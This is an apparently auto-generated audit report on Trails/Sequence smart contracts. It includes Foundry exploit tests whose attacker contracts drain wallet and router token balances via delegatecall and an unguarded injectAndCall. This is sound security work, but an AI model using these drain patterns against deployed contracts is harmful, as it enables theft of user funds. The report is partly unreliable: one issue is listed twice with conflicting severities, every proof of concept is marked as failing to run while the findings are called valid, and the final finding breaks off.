# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = true; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;

 **Derived From** : Hardcoded delegatecall to external MULTICALL3 without codehash check can execute arbitrary logic

[H-1]. Hardcoded delegatecall into external MULTICALL3 lets attacker-owned implementation drain wallet funds
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless
[M-2]. Hardcoded delegatecall to external MULTICALL3 lets attacker‑controlled implementation drain Sequence wallets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : injectAndCall lacks delegatecall guard and can drain router-held funds

[M-3]. Public injectAndCall lets anyone sweep all ERC20/ETH held by TrailsRouter
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Tstorish flag uses caller storage under delegatecall, breaking TSTORE fallback semantics

[M-4]. Tstorish storage flag collides with caller storage under delegatecall, potentially bricking TrailsRouterShim on non-TSTORE chains
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 3
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Hardcoded delegatecall to external MULTICALL3 without codehash check can execute arbitrary logic

## [H-1]. Hardcoded delegatecall into external MULTICALL3 lets attacker-owned implementation drain wallet funds

### Finding Severity Justification: The router performs a raw delegatecall to a hardcoded external address MULTICALL3 (0xcA11...CA11) without any verification of its code or immutability. When the router is used as intended via delegatecall from a Sequence v3 wallet, this produces a nested delegatecall chain: wallet → RouterShim (delegatecall) → TrailsRouter (delegatecall) → MULTICALL3 (delegatecall). The final delegatecall executes in the wallet’s storage context. If on any chain the address 0xcA11...CA11 is not the canonical immutable Multicall3 but an attacker-controlled or otherwise different contract, that contract can execute arbitrary logic in the wallet context and drain all ERC20/native balances or corrupt wallet configuration. This is a direct, realistic full-compromise of user assets under plausible deployment conditions (new chain, misconfigured or malicious MULTICALL3 address), thus High severity.
## Derived From Pattern/Invariant
Hardcoded delegatecall to external MULTICALL3 without codehash check can execute arbitrary logic

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
TrailsRouter.execute / pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter hardcodes an external Multicall3 address and uses it via `delegatecall` without validating the implementation code:

`address public immutable MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;`

```solidity
function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
    _validateRouterCall(data);
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}

function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
    public
    payable
    returns (IMulticall3.Result[] memory returnResults)
{
    _validateRouterCall(data);
    if (token == address(0)) {
        if (msg.value < amount) revert InsufficientEth(amount, msg.value);
    } else {
        _safeTransferFrom(token, msg.sender, address(this), amount);
    }

    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}
```

The only check before the `delegatecall` is `_validateRouterCall`, which enforces that the selector is `aggregate3Value` and that all `allowFailure` flags are false. It **does not verify** that the contract at `0xcA11…CA11` actually contains the canonical, immutable Multicall3 bytecode.

On any chain where that address is:
- not deployed yet (attacker can deploy a malicious implementation first),
- already deployed to an incompatible or upgradable contract, or
- later swapped out via governance to different logic,

`MULTICALL3.delegatecall(data)` becomes an **untrusted delegatecall primitive**.

When TrailsRouter is used as intended via `delegatecall` from Sequence wallets (Sequence → RouterShim.delegatecall → TrailsRouter.delegatecall → MULTICALL3.delegatecall), the Multicall3 code runs in the **wallet’s storage context**. A malicious Multicall3 implementation can then:
- arbitrarily call external contracts from the wallet context (e.g. `ERC20.transfer`),
- mutate wallet storage (owners, modules, nonces, approvals, etc.),
- transfer out or approve away all ERC‑20 / ETH held by the wallet,
- bypass the intended Merkle-tree intent authorization.

Since the router never validates the code hash or immutability of the contract at `MULTICALL3`, control over that address on a given chain effectively grants control over all wallets using this router on that chain.

## Impact
On any chain where `0xcA11bde05977b3631167028862bE2a173976CA11` does not correspond to the expected immutable Multicall3 implementation, the TrailsRouter’s `execute` and `pullAmountAndExecute` functions turn into a powerful arbitrary-code primitive. Because these functions use `delegatecall` to the hardcoded `MULTICALL3` address, and the router itself is intended to be invoked via `delegatecall` from a Sequence v3 wallet (through the shim), a malicious or non-canonical contract at that address will execute in the wallet’s storage and balance context. An attacker controlling the code at `0xcA11…CA11` on a given chain can then:
- freely read and mutate the wallet’s storage (owners, modules, nonces, approvals, sentinels, etc.),
- transfer or approve away any ERC20 balances held by the wallet,
- send native ETH held by the wallet,
- and generally bypass or subvert all intended Trails/Sequence authorization logic.

This yields full compromise of any wallet or intent execution flow that delegatecalls into TrailsRouter on that chain. The practical exploitability depends on how carefully deployments ensure that the canonical Multicall3 is present and immutable at that address on each supported chain; however, if a new or misconfigured chain is added where an attacker can front-run or replace that address, user funds and wallet invariants are directly at risk.

## Command to Run Test


## Proof of Concept


## Proof of Code


## Suggested Mitigation
Eliminate the use of an unverified, hardcoded external implementation as a `delegatecall` target:

1. **Make the Multicall target explicit and chain-specific**
   - Remove the in-contract hardcoded `MULTICALL3` constant.
   - Instead, pass the Multicall3 address to the router constructor (or to a factory) on deployment for each chain:
     - `constructor(address multicallAddress) { MULTICALL3 = multicallAddress; ... }`
   - This forces each deployment to consciously specify which Multicall contract to trust per chain.

2. **Enforce code immutability / identity at deployment time**
   - At construction, verify the code hash (or full bytecode) of the provided `multicallAddress` against a precomputed canonical value and revert if it does not match:
     - `require(multicallAddress.code.length != 0, "Multicall not deployed");`
     - `require(keccak256(multicallAddress.code) == EXPECTED_MULTICALL3_CODEHASH, "Bad Multicall implementation");`
   - Store the verified address immutably.
   - This prevents accidental configuration to an incorrect or upgradable contract.

3. **Avoid delegatecall if storage mutation from Multicall is not required**
   - If the desired behavior is only to batch external calls without Multicall ever touching wallet storage, refactor `execute` / `pullAmountAndExecute` to use `call` instead of `delegatecall` to Multicall3 when invoked from the wallet context. In that model, Multicall3 operates on its own storage and cannot directly corrupt wallet state; you can still preserve `msg.sender` to downstream targets by having the wallet delegatecall into a router that uses plain `call` to Multicall3, with the wallet address passed explicitly in calldata where needed.

4. **Operational safeguards**
   - Restrict supported chains to those where you have verified that the CA11…CA11 deployment is the canonical, non-upgradeable Multicall3, or explicitly deploy and maintain your own immutable Multicall3 instance for Trails’ use.
   - Document this requirement in deployment runbooks and add CI checks to ensure the configured `MULTICALL3` address matches the expected code hash on each chain before shipping.

Combining a constructor-time codehash check with a per-chain configurable Multicall address, and switching to `call` where possible, removes the untrusted-delegatecall primitive and prevents an attacker-controlled contract at `0xcA11…CA11` from compromising wallets.


## [M-2]. Hardcoded delegatecall to external MULTICALL3 lets attacker‑controlled implementation drain Sequence wallets

### Finding Severity Justification: The router performs a nested delegatecall into a hardcoded external Multicall3 address. In the intended production deployment, this address is the canonical Multicall3 singleton, which the project does not control but which is widely deployed and effectively treated as immutable infrastructure. If an attacker could control or replace the code at that address on a given chain (e.g., on a new or non‑canonical chain, or via some chain‑specific governance or bug), they could execute arbitrary logic in the Sequence wallet storage context and drain assets whenever TrailsRouter.execute/pullAndExecute are used. That is a direct asset‑theft vector per wallet. However, the attack relies on a fairly strong external assumption: that the well‑known Multicall3 singleton at 0xcA11…CA11 is malicious or compromised on the target chain. This is outside the protocol’s own code and deployment model, and on main EVM chains this address is expected to be a safe, public-good deployment. Thus impact is high but likelihood is limited by external conditions; under Code4rena’s rubric this aligns best with Medium.
## Derived From Pattern/Invariant
Hardcoded delegatecall to external MULTICALL3 without codehash check can execute arbitrary logic

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
TrailsRouter.execute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter hardcodes a global MULTICALL3 address and uses it via `delegatecall` without any codehash or interface validation:

```solidity
address public immutable MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
    _validateRouterCall(data);
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}

function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
    public
    payable
    returns (IMulticall3.Result[] memory returnResults)
{
    _validateRouterCall(data);
    if (token == address(0)) {
        if (msg.value < amount) revert InsufficientEth(amount, msg.value);
    } else {
        _safeTransferFrom(token, msg.sender, address(this), amount);
    }

    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}
```

The only pre‑check is on `data` (`_validateRouterCall` enforces the selector is `aggregate3Value` and all `allowFailure == false`). Nothing verifies that `0xcA11…CA11` is actually the canonical, immutable Multicall3 implementation; it can be any contract.

When TrailsRouter is used as a Sequence v3 delegated extension (the primary intended mode), the call stack is:

`SequenceWallet` → **delegatecall** → `TrailsRouterShim` → **delegatecall** → `TrailsRouter.execute` → **delegatecall** → `MULTICALL3`.

Under nested `delegatecall`, the code at `MULTICALL3` executes in the **wallet’s storage context** (`address(this)` is the wallet). If, on a given chain, the contract deployed at `0xcA11…CA11` is malicious or upgradeable, its `aggregate3Value` implementation can:

- Arbitrarily transfer out ERC‑20s and ETH held by the wallet;
- Mutate wallet configuration or module state;
- Bypass Trails’ intended Merkle‑tree based authorization by ignoring the `calls` array and executing arbitrary logic instead.

This is a classic beacon/factory authority drift: a critical delegatecall target is hard‑bound to an external address whose code the protocol does not control or validate. Control over that address on any chain effectively grants control over every wallet using TrailsRouter on that chain.

## Impact
On any chain where `0xcA11…CA11` is deployed with malicious or non‑canonical code, all Sequence v3 wallets (or other contracts) that delegatecall into TrailsRouter can have their entire ERC‑20 and ETH balances drained, or their state arbitrarily corrupted, whenever they execute a Trails multicall. This is a direct asset theft vector with unbounded loss per affected wallet.

## Command to Run Test


## Proof of Concept
1. Attacker ensures that the address `0xcA11bde05977b3631167028862bE2a173976CA11` on some chain contains attacker‑controlled code implementing the `IMulticall3` interface (or at least the `aggregate3Value` selector).
2. The attacker’s `aggregate3Value` ignores the supplied `calls` and instead drains all ERC‑20 tokens from `address(this)` to the attacker (remember `address(this)` will be the wallet due to nested `delegatecall`).
3. A victim uses a Sequence v3 wallet that integrates Trails and signs an intent which ultimately triggers `TrailsRouter.execute(...)` via the standard `handleSequenceDelegateCall` path.
4. Inside `execute`, TrailsRouter performs `MULTICALL3.delegatecall(data)`. Because this is nested under two `delegatecall`s, the malicious Multicall3 code runs in the wallet context.
5. `aggregate3Value` transfers out all balances of a chosen token (or multiple tokens) from the wallet to the attacker.
6. `execute` still succeeds (the malicious contract returns a syntactically correct `Result[]`), so the Trails flow does not revert, but the wallet’s assets are gone.

This requires no privilege on Trails contracts; the attacker only needs to control the code at the hardcoded MULTICALL3 address on the victim chain.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TT") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousMulticall3 is IMulticall3 {
    IERC20 public immutable token;
    address public immutable attacker;

    constructor(address _token, address _attacker) {
        token = IERC20(_token);
        attacker = _attacker;
    }

    // Executed via delegatecall in the wallet context
    function aggregate3Value(Call3Value[] calldata) external payable override returns (Result[] memory results) {
        uint256 bal = token.balanceOf(address(this));
        if (bal > 0) {
            // address(this) is the Sequence wallet when called via nested delegatecall
            token.transfer(attacker, bal);
        }
        results = new Result[](1);
        results[0] = Result({success: true, returnData: ""});
    }

    function aggregate3(Call3[] calldata) external payable override returns (Result[] memory results) {
        results = new Result[](0);
    }
}

contract WalletMock {
    address public router;

    constructor(address _router) {
        router = _router;
    }

    // Simulate Sequence wallet calling TrailsRouter via delegatecall
    function run(bytes calldata data) external {
        (bool ok,) = router.delegatecall(
            abi.encodeWithSelector(TrailsRouter.execute.selector, data)
        );
        require(ok, "router delegatecall failed");
    }
}

contract TrailsRouterExploitsTest is Test {
    TrailsRouter router;
    TestToken token;
    WalletMock wallet;
    address attacker = address(0xBEEF);
    address victim = address(0xCAFE);

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();
        wallet = new WalletMock(address(router));
    }

    function test_MaliciousMulticallDrainsWallet() public {
        // Give the mock wallet some tokens
        token.mint(address(wallet), 100 ether);

        // Deploy malicious multicall and patch code at the router's MULTICALL3 address
        MaliciousMulticall3 mal = new MaliciousMulticall3(address(token), attacker);
        address multicallAddr = router.MULTICALL3();
        vm.etch(multicallAddr, address(mal).code);

        uint256 attackerBefore = token.balanceOf(attacker);
        uint256 walletBefore = token.balanceOf(address(wallet));

        // Build dummy aggregate3Value calldata that passes _validateRouterCall
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(0xdead),
            allowFailure: false,
            value: 0,
            callData: ""
        });
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        // Victim triggers router.execute via delegatecall in the wallet context
        vm.prank(victim);
        wallet.run(data);

        uint256 attackerAfter = token.balanceOf(attacker);
        uint256 walletAfter = token.balanceOf(address(wallet));

        assertGt(attackerAfter, attackerBefore, "attacker gained tokens");
        assertEq(walletAfter, 0, "wallet drained");
        assertEq(attackerAfter, walletBefore + attackerBefore, "all wallet funds stolen");
    }
}


## Suggested Mitigation
Avoid delegating arbitrary external code into the wallet context via a hardcoded address. Concretely:
- Inline the minimal Multicall3 `aggregate3Value` logic directly in TrailsRouter (or a tightly‑controlled internal library) instead of using an external contract; and/or
- If you must use the canonical Multicall3 deployment, enforce a strict codehash check before use, e.g. `require(MULTICALL3.codehash == EXPECTED_HASH)` and revert otherwise, so that any non‑canonical or upgradeable contract at that address is rejected; and
- Prefer `call` instead of `delegatecall` where possible; if preserving `msg.sender` is required, tightly constrain the delegated code to audited, immutable bytecode whose hash is asserted on‑chain.





 **Derived From** : injectAndCall lacks delegatecall guard and can drain router-held funds

## [M-3]. Public injectAndCall lets anyone sweep all ERC20/ETH held by TrailsRouter

### Finding Severity Justification: injectAndCall is explicitly documented as a delegatecall-context helper but is exposed as an unrestricted public function without the onlyDelegatecall guard. When called directly on the deployed TrailsRouter singleton, it operates on address(this) and can forward the entire ETH balance to an arbitrary target via a raw call, or grant an arbitrary target a full allowance over all ERC20 tokens held by the router. Any user mistakenly or indirectly sending tokens/ETH to the router contract (e.g., via injectSweepAndCall to a target that does not consume funds, or accidental transfers) creates a shared pool that any attacker can drain. This does not affect per-user wallets when used as designed (via delegatecall), but it does enable complete theft of any assets that end up on the router implementation itself, which are real assets at risk. That maps to asset loss with constrained scope (router-held funds) rather than systemic protocol breakage, hence Medium.
## Derived From Pattern/Invariant
injectAndCall lacks delegatecall guard and can drain router-held funds

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`injectAndCall` is documented for delegatecall use from Sequence wallets but is exposed as a public function without the `onlyDelegatecall` guard:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}
```

`_getSelfBalance(token)` reads the full balance of `address(this)` (the TrailsRouter implementation when called directly). `_injectAndExecuteCall` then forwards that entire balance to an arbitrary `target`:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional calldata replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        ...
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        ...
    }
}
```

Other public helpers such as `injectSweepAndCall`, `pullAndExecute`, or accidental transfers can leave ETH or ERC‑20 tokens on the TrailsRouter implementation contract (e.g. if downstream protocols only consume part of the approved amount, or a user sends tokens directly to the router). Because `injectAndCall` operates on the router’s own balance and is callable by anyone, any external attacker can:

- For ETH: call `injectAndCall(address(0), attacker, ...)` and have `_injectAndExecuteCall` send **all ETH** held by TrailsRouter to `attacker`.
- For ERC‑20s: set `target` to an arbitrary contract, which receives an allowance equal to the router’s full token balance and can immediately `transferFrom` those tokens to the attacker.

This is an access control failure: sweeping functions that operate on shared router balances are expected to be usable only via delegatecall in a wallet context, but `injectAndCall` exposes that primitive to anyone.

## Impact
Any ETH or ERC‑20 tokens residing on the TrailsRouter implementation contract can be fully stolen by a public attacker. These balances may come from legitimate flows (e.g. `injectSweepAndCall` or `pullAmountAndExecute` where the downstream target only spends part of the funds) or from assets mistakenly sent to the router. The blast radius is the entire router balance for each affected token.

## Command to Run Test


## Proof of Concept
1. A user invokes `injectSweepAndCall` (or similar) with an ERC‑20 token, transferring tokens from the user to the TrailsRouter contract, but calling a target that does not actually spend them (or only spends part). After the call, the router holds the user’s tokens.
2. An attacker observes that `token.balanceOf(address(TrailsRouter)) > 0`.
3. The attacker deploys a helper contract `TokenStealer` with a function `steal(address token, address to, uint256 amount)` that calls `IERC20(token).transferFrom(msg.sender, to, amount)`.
4. The attacker then calls `TrailsRouter.injectAndCall(token, address(TokenStealer), stealCalldata, 0, 0x0)`, where `stealCalldata` encodes a call to `TokenStealer.steal(token, attacker, routerBalance)` and `routerBalance` is the router’s full token balance.
5. Inside `injectAndCall`, `_getSelfBalance(token)` returns the router’s full token balance. `_injectAndExecuteCall` executes the ERC‑20 branch: it performs `forceApprove(token, target, callerBalance)`, granting `TokenStealer` an allowance equal to the entire router balance, and then calls `TokenStealer.steal(...)`.
6. `TokenStealer.steal` runs with `msg.sender == TrailsRouter` and calls `transferFrom(router, attacker, routerBalance)`, which succeeds thanks to the allowance, draining all tokens from the router to the attacker.
7. A similar pattern can be used with `token == address(0)` to drain all ETH from the router by simply specifying a payable `target` that accepts the forwarded value.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TT") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract WalletMock {
    address public router;
    constructor(address _router) { router = _router; }
    function run(bytes calldata data) external {
        (bool ok,) = router.delegatecall(
            abi.encodeWithSelector(TrailsRouter.execute.selector, data)
        );
        require(ok, "router delegatecall failed");
    }
}

contract NoopTarget {
    function noop() external {}
}

contract TokenStealer {
    function steal(address token, address to, uint256 amount) external {
        // msg.sender will be TrailsRouter
        IERC20(token).transferFrom(msg.sender, to, amount);
    }
}

contract TrailsRouterExploitsTest is Test {
    TrailsRouter router;
    TestToken token;
    WalletMock wallet;
    address attacker = address(0xBEEF);
    address victim = address(0xCAFE);

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();
        wallet = new WalletMock(address(router));
    }

    function test_InjectAndCallAllowsAnyoneToDrainRouterFunds() public {
        // Victim deposits tokens into TrailsRouter via injectSweepAndCall
        vm.startPrank(victim);
        token.mint(victim, 100 ether);
        token.approve(address(router), type(uint256).max);

        NoopTarget noop = new NoopTarget();
        bytes memory noopCalldata = abi.encodeWithSelector(noop.noop.selector);

        // This pulls 100 tokens into the router and calls a target that does nothing
        router.injectSweepAndCall(address(token), address(noop), noopCalldata, 0, bytes32(0));
        vm.stopPrank();

        uint256 routerBalance = token.balanceOf(address(router));
        assertEq(routerBalance, 100 ether, "router holds victim funds");

        // Attacker drains router balance via public injectAndCall
        TokenStealer stealer = new TokenStealer();

        vm.startPrank(attacker);
        bytes memory stealCalldata = abi.encodeWithSelector(
            stealer.steal.selector,
            address(token),
            attacker,
            routerBalance
        );

        router.injectAndCall(address(token), address(stealer), stealCalldata, 0, bytes32(0));
        vm.stopPrank();

        assertEq(token.balanceOf(address(router)), 0, "router drained");
        assertEq(token.balanceOf(attacker), routerBalance, "attacker received router funds");
    }
}


## Suggested Mitigation
If `injectAndCall` is intended only for delegatecall usage in a wallet context, add the `onlyDelegatecall` modifier so it cannot operate on the router implementation’s own balances:

```solidity
function injectAndCall(...) public payable onlyDelegatecall { ... }
```

and have Sequence wallets reach it exclusively via `handleSequenceDelegateCall` and `_injectAndCallDelegated`.

If you also want a standalone helper for EOAs, do **not** operate on `address(this)` in that path. Instead, mirror the pattern used in `injectSweepAndCall`:

- Pull the user’s tokens from `msg.sender` into a temporary balance;
- Approve and call the target using only that per‑caller balance;
- Never expose a generic "sweep router balance" primitive to untrusted callers.

Alternatively, remove or make `injectAndCall` internal and route all wallet usage through the guarded `_injectAndCallDelegated` helper.





 **Derived From** : Tstorish flag uses caller storage under delegatecall, breaking TSTORE fallback semantics

## [M-4]. Tstorish storage flag collides with caller storage under delegatecall, potentially bricking TrailsRouterShim on non-TSTORE chains

### Finding Severity Justification: The issue can brick TrailsRouterShim-based intent execution on chains where TSTORE is not supported at deploy time and where wallets have a non‑zero value in storage slot 0. In that environment, every handleSequenceDelegateCall that tries to set the success sentinel will revert due to an invalid tstore opcode, preventing Trails intents from completing for affected wallets (full DoS of Trails flows for those users on that chain). This impacts protocol availability and correct operation, but does not directly enable theft or loss of user assets, so it fits Code4rena’s "Medium" category (assets not directly at risk, but protocol function and availability are impacted).
## Derived From Pattern/Invariant
Tstorish flag uses caller storage under delegatecall, breaking TSTORE fallback semantics

## Exploit Type
StorageLayout

## Location
TrailsRouterShim.handleSequenceDelegateCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouterShim is designed to be invoked only via delegatecall from a Sequence v3 wallet:

- `handleSequenceDelegateCall` is guarded by `onlyDelegatecall`, so it always runs in the caller wallet’s storage context.
- The shim inherits `Tstorish`, which introduces a state variable `bool private _tstoreSupport;` in storage slot 0 and an external toggle `__activateTstore()`.
- In the Tstorish constructor, the immutable function pointer `_setTstorish` is set to either:
  - `_setTstore` (always uses `tstore`) when TSTORE is available at deploy time, or
  - `_setTstorishWithSstoreFallback` (runtime switch) otherwise.

On chains that did **not** support TSTORE at deployment, `_setTstorish` is bound to the fallback implementation:

```solidity
function _setTstorishWithSstoreFallback(uint256 storageSlot, uint256 value) private {
    if (_tstoreSupport) {
        assembly { tstore(storageSlot, value) }
    } else {
        assembly { sstore(storageSlot, value) }
    }
}
```

In `TrailsRouterShim.handleSequenceDelegateCall`, after forwarding the call to the router, the shim records a success sentinel in storage:

```solidity
uint256 slot = TrailsSentinelLib.successSlot(opHash);
_setTstorish(slot, TrailsSentinelLib.SUCCESS_VALUE);
```

Because `handleSequenceDelegateCall` runs via **delegatecall**, all reads/writes to `_tstoreSupport` inside `_setTstorishWithSstoreFallback` are done in the **caller wallet’s** storage, not the shim’s storage. Concretely:

- `_tstoreSupport` is mapped to slot 0 of the wallet’s storage layout.
- Sequence wallets use slot 0 for their own state (e.g. config/owner), which will almost certainly be non-zero.
- Therefore, on chains where `_setTstorish` is the fallback, `_tstoreSupport` will appear as `true` for typical wallets, causing `_setTstorishWithSstoreFallback` to execute `tstore` instead of `sstore`.

This has two important consequences:

1. **On chains where TSTORE is not supported at runtime** (no Dencun/1153 yet), executing `tstore` is an invalid opcode, so every call to `handleSequenceDelegateCall` that attempts to set the sentinel will revert. That effectively bricks Trails intent execution for any wallet whose slot 0 is non-zero on such chains.

2. Even on chains that later gain TSTORE support, the runtime switch between `sstore` and `tstore` is governed by the wallet’s slot 0 (arbitrary wallet state), not by the shim’s intended `_tstoreSupport` flag. Different wallets (or even different moments in a wallet’s lifecycle) may see different behavior (persistent vs transient sentinels) depending purely on their internal storage, violating the assumption that sentinel storage semantics are uniform and controlled solely by `Tstorish`.

The external `__activateTstore()` on the shim writes `_tstoreSupport` in the **shim’s** storage context (when called directly), but under delegatecall the fallback reads `_tstoreSupport` from the wallet’s storage. This means:

- Calling `__activateTstore()` on the shim does **not** change the branch `_setTstorishWithSstoreFallback` will take when invoked via delegatecall from a wallet.
- The intended ability to flip from `sstore` to `tstore` once a chain upgrades is broken for the delegated extension.

Because the success sentinel written by `_setTstorish` is used to gate later sweeps/refunds via `TrailsSentinelLib.successSlot(opHash)`, any environment where `_setTstorish` unexpectedly reverts or uses the wrong backend (tstore when not supported) can cause a denial-of-service for Trails flows on that chain.

Vulnerable snippet (simplified):

```solidity
contract TrailsRouterShim is DelegatecallGuard, Tstorish {
    function handleSequenceDelegateCall(
        bytes32 opHash,
        uint256,
        uint256,
        uint256,
        uint256,
        bytes calldata data
    ) external onlyDelegatecall {
        (bytes memory inner, uint256 callValue) = abi.decode(data, (bytes, uint256));
        bytes memory routerReturn = _forwardToRouter(inner, callValue);

        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        _setTstorish(slot, TrailsSentinelLib.SUCCESS_VALUE); // uses caller’s storage under delegatecall

        assembly {
            return(add(routerReturn, 32), mload(routerReturn))
        }
    }
}

contract Tstorish {
    bool private _tstoreSupport; // slot 0, but under delegatecall this is the wallet’s slot 0

    function _setTstorishWithSstoreFallback(uint256 storageSlot, uint256 value) private {
        if (_tstoreSupport) {
            assembly { tstore(storageSlot, value) }
        } else {
            assembly { sstore(storageSlot, value) }
        }
    }
}
```

## Impact
When TrailsRouterShim is deployed on a chain where TSTORE was not available at deployment time, it wires its internal setters/getters to the Tstorish fallback functions that consult the `_tstoreSupport` storage flag. Because the shim is only ever used via `delegatecall` from Sequence wallets, all reads/writes to `_tstoreSupport` in those fallback functions are performed in the caller wallet’s storage, not in the shim’s own storage. Concretely, the `_tstoreSupport` boolean occupies storage slot 0, which collides with the wallet’s own slot 0 (typically non-zero). As a result, under delegatecall the fallback will usually see `_tstoreSupport == true` and attempt to execute `tstore`, even though the shim was originally deployed on a non-TSTORE chain and intended to use `sstore` until explicitly activated. On chains that still do not implement TSTORE at runtime, this causes an immediate invalid-opcode revert at every sentinel write, breaking `handleSequenceDelegateCall` and causing a denial-of-service for Trails flows for affected wallets. Even once TSTORE is supported, the choice between `sstore` and `tstore` is controlled by the caller’s slot-0 contents rather than the shim’s configuration, so different wallets, or the same wallet over time, may experience different sentinel semantics (persistent vs transient) for identical shim bytecode. Additionally, calling `__activateTstore()` on the shim instance updates `_tstoreSupport` in the shim’s own storage, but has no effect on the value observed under delegatecall (which still reads the wallet’s slot 0). This breaks the intended post-deployment upgrade path and makes sentinel backend selection effectively non-configurable and dependent on external wallet layout.

## Command to Run Test


## Proof of Concept
Conceptual exploit on a chain where TSTORE was not available at TrailsRouterShim deployment time (so `_setTstorish` is wired to the fallback):

1. The Trails team deploys `TrailsRouterShim` on a chain that did not support TSTORE/TLOAD at that moment. During the Tstorish constructor, `_testTload` fails and `_setTstorish` is bound to `_setTstorishWithSstoreFallback`.
2. A Sequence v3 wallet exists (or is deployed) on that chain. Its own storage slot 0 is used for wallet state (e.g. owner/config) and is non-zero in normal operation.
3. Later, a Trails intent is constructed so that the Sequence kernel will execute a call into `TrailsRouterShim.handleSequenceDelegateCall` via `delegatecall` from that wallet.
4. At execution time, the Sequence kernel `delegatecall`s from the wallet into `handleSequenceDelegateCall`. All state accesses in the shim (including Tstorish’s `_tstoreSupport`) now occur in the wallet’s storage context.
5. Inside `handleSequenceDelegateCall`, after successfully forwarding to the router, the shim computes the sentinel slot `slot = TrailsSentinelLib.successSlot(opHash)` and calls `_setTstorish(slot, TrailsSentinelLib.SUCCESS_VALUE)`.
6. Because `_setTstorish` points to `_setTstorishWithSstoreFallback`, and under `delegatecall` `_tstoreSupport` is read from the wallet’s slot 0 (non-zero), the `if (_tstoreSupport)` condition evaluates to true. The function executes the `tstore(storageSlot, value)` opcode rather than `sstore`.
7. On a chain whose EVM still does not implement TSTORE/TLOAD, this `tstore` opcode is invalid and causes an immediate revert with an invalid-opcode error.
8. Therefore, every `handleSequenceDelegateCall` execution that attempts to set the success sentinel reverts for any wallet with a non-zero slot 0. Trails intents targeting those wallets on that chain cannot complete, resulting in a persistent denial-of-service.

A second, configuration-related issue manifests even if/when TSTORE becomes available:

1. Assume the same setup as above, but the chain has now upgraded so that TSTORE/TLOAD opcodes are live.
2. The project calls `__activateTstore()` on the deployed TrailsRouterShim contract address, expecting future `_setTstorish` calls to flip from `sstore` to `tstore`.
